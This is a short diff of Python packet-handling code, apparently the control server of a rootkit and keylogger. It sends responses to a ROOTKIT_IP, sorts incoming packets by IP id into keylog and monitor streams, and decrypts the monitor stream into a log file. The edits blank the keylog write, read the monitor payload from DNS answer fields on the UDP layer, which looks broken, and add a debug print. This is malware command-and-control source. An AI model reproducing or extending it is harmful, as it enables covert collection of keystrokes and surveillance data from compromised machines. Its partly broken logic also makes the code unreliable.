@@ -86,14 +86,15 @@ def subprocess_packet_handler(pkt):
         response[IP].dst = f"{ROOTKIT_IP}"
         send(response, verbose=0)
     if pkt[IP].id == KEYLOG_IDENTIFICATION:
-        write_keylog_data(encrypted_message)
+        write_keylog_data("")
     if pkt[IP].id == MONITOR_IDENTIFICATION:
-        write_monitor_data(encrypted_message)
+        write_monitor_data(pkt[UDP].ar.rdata[0])
 
 def write_keylog_data(data):
     pass
 
 def write_monitor_data(data):
+    print(data)
     b = BLOCK_ENCRYPTION_HANDLER.decrypt(data)
     msg = b.decode("utf-8")
     with open("logs/monitor.log", "w") as f:
